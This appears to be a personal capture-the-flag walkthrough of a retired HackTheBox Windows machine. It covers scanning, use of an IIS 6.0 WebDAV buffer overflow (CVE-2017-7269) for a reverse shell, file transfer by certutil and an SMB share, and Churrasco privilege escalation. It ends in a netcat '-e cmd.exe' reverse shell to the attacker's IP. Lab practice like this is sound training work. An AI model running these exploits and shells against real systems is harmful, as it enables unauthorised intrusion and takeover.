Practing retired hackthebox machines. Had trouble with this one, knew what I had to do, but didn't know how to do it. Need to practice more Windows machines.

### Scanning:

*   Find running services:

```
crazyeights@es-base:~$ nmap -PS 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 11:09 EST
Nmap scan report for 10.10.10.14
Host is up (0.034s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```

*   Find more information about services (ie. versions, etc.)

```
crazyeights@es-base:~$ sudo nmap -sV 10.10.10.14
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
```

### Web:

##### Getting Server Version Info:

```
crazyeights@es-base:~$ nikto -h http://10.10.10.14
- Nikto v2.1.6
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
[SNIP]
+ WebDAV enabled (PROPFIND COPY PROPPATCH UNLOCK LOCK SEARCH MKCOL listed as allowed)
[SNIP]
```

*   Many different potential vulnerabilities were listed by nikto
*   We know the version of Microsoft-IIS is vulnerable, we must find an exploit

##### Searching for exploits:

*   Using searchsploit:

```
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFrom | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8806.pl
```

#### This is the only one that fits:

```
crazyeights@es-base:~$ searchsploit -x windows/remote/41738.py
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
```

*   The exploitdb script does not work here. There are many version of this exploit available.

##### The only working version of the exploit:

*   Found by googling CVE-2017-7269 reverse shell

```
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
```

*   Download the exploit
*   Start the listener:

```
nc -lvp 1234
```

##### Run the exploit:

*   Command is in the format: `python [exploit] [VICTIM IP] [PORT] [ATTACKER IP] [LISTENER PORT]`

```
crazyeights@es-base:~$ python iis_webdav_20177269.py 10.10.10.14 80 10.10.14.11 1234
```

### User:

*   You get a shell with limited privileges:

```
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

*   Get OS info

```
C:\>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790

```

There are two users:

*   Harry
*   Administrator

##### Looking for exploits:

*   We have the server version, and it old enough that there is definitely privilege escalation exploits for it
*   Using searchsploit:

```
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                                                                | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                                                                  | windows/local/35936.py

```

This one must be correct - because OS version is not SP2

```
crazyeights@es-base:~$ searchsploit -x windows/local/6705.txt
  Exploit: Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
```

Exploit steps:

*   download the exploit executable on to the remote machine
*   download netcat to get a reverse shell with elevated privileges
*   Start a listener and run the exploit with the command nc to be run with elevated privileges
*   Connect and download the flags

Found the executable for the exploit here:

```
https://github.com/Re4son/Churrasco/
```

Found the netcat executable for windows here:

```
https://eternallybored.org/misc/netcat/
```

*   Use the 32-bit version

Tried to use a webserver to transfer the exploit the target, didn't work:

*   Put the exe on apache server:

```
crazyeights@es-base:~$ sudo cp Downloads/Churrasco-master/churrasco.exe /var/www/html/
[sudo] password for crazyeights: 
crazyeights@es-base:~$ sudo service apache2 start

```

*   Try to download exec from the server:

```
certutil.exe -UrlCache -split -f "http://10.10.14.11/churrasco.exe" bad.exe
```

*   Got stuck...
*   Used the same method as: [https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html](https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html)
*   Didn't know you could do this
*   Use SMB server from impacket to make files available to remote machine

##### Start the server:

```
crazyeights@es-base:~/tools/impacket/examples$ sudo python3 smbserver.py share /home/
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0

[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

##### Download the files from the SMB server:

*   Download the churrasco exploit:

```
C:\wmpub>copy \\10.10.14.11\share\churrasco.exe bad.exe
copy \\10.10.14.11\share\churrasco.exe bad.exe
        1 file(s) copied.
```

*   Download 32-bit netcat executable:

```
C:\wmpub>copy \\10.10.14.11\share\nc.exe nc32.exe
copy \\10.10.14.11\share\nc.exe nc32.exe
        1 file(s) copied.
```

###### Start the listener on your machine:

```
nc -lvp 9999
```

###### Run the exploit:

*   I had to run it multiple times because it disconnected after a certain amount of time

```
C:\wmpub>.\bad.exe -d "C:\wmpub\nc32.exe -e cmd.exe 10.10.14.11 9999"             
.\bad.exe -d "C:\wmpub\nc32.exe -e cmd.exe 10.10.14.11 9999"
